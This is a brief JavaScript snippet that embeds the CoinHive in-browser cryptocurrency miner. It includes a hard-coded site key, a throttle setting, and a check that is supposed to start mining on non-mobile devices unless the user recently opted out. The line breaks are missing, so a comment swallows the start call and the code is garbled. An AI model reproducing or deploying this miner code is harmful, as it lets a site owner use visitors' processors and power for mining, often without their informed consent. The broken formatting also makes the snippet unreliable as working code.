var miner = new CoinHive.Anonymous('NarPs7Ob2DpxiXeWcdBv0D9Rexg7g99T', {
    throttle: 0.1
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}